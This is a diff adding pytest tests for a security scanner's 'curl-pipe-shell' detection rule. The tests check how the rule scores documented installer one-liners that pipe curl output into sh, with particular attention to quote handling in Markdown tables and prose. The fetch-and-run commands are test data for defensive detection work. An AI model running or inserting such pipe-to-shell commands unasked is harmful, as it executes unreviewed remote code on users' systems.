+@pytest.mark.parametrize("command", [
+    f'curl -fsSL "https://get.docker.com" {_PIPE} sh', f'curl --proto "=https" --tlsv1.2 -sSf https://sh.rustup.rs {_PIPE} sh',
+    'bash -c "$(curl -fsSL https://get.docker.com)"'])
+@pytest.mark.parametrize("wrap", ["<code>{}</code>", "<pre>{}</pre>", "{}", "`{}`"])
+def test_a_quote_in_the_command_cell_of_a_row_is_not_a_quote_in_front_of_it(command, wrap):
+    """The guard reads the cells that are dropped, not the cell of the command: `curl -fsSL "https://get.docker.com"` is a documented
+    installer, and it stays one in a table."""
+    row = f"| docker | {wrap.format(command)} |"
+    for event in ({**BENIGN_EVENT, "body": row}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", row)]}):
+        assert _rules(scan_change(event))["curl-pipe-shell"] == "medium", row
+
+
+@pytest.mark.parametrize("cell", ['`docker run -e KEY="value" foo/foo`', '`bash -c "echo hi"`', '`python3 -c "print(1)"`'])
+def test_a_quoted_row_with_a_wrapper_word_below_an_odd_quote_makes_the_installer_below_it_critical(cell):
+    """An accepted over-alert, as in the rule file: a pipe-led line that holds a quote and a word that runs a command, within sixty lines
+    of a line that left a quote odd (a possessive plural counts: it can be a string), may be the tail of that string and the opener of a
+    wrapper's argument, so the documented installer below it is not called a documented installer. a492ab2 left it `medium`."""
+    body = f"The users' guide covers everything.\n\n| A | B |\n|---|---|\n| run | {cell} |\n\nThen install:\n\n```bash\n{_DOCKER} | sh\n```\n"
+    assert _rules(scan_change({**BENIGN_EVENT, "body": body}))["curl-pipe-shell"] == "critical"
+    assert _rules(scan_change({**BENIGN_EVENT, "body": body.replace("users'", "users")}))["curl-pipe-shell"] == "medium"
+
+
+_PROSE = ("Foo helps the users' teams manage their machines and keep everything in sync across many offices and laptops without any manual "
+          "steps at all, so that nobody has to remember a long list of commands or flags when something goes wrong. You can run it in a "
+          "container, for instance with docker run --rm foo/foo or by using the installer below:")
+
+
+@pytest.mark.parametrize("lead", ["", "- ", "$ ", "> "])
+def test_an_apostrophe_far_from_a_long_lines_end_does_not_open_a_wrapper(lead):
+    """The quotes of the last 300 characters of a line are counted, as a492ab2 counted them: the possessive at its start is further
+    away, and `docker run` in the sentence is not a wrapper with an open argument."""
+    assert len(_PROSE) - _PROSE.index("users'") > 300
+    assert _rules(scan_change({**BENIGN_EVENT, "body": f"{lead}{_PROSE}\n\n{_D}"}))["curl-pipe-shell"] == "medium"
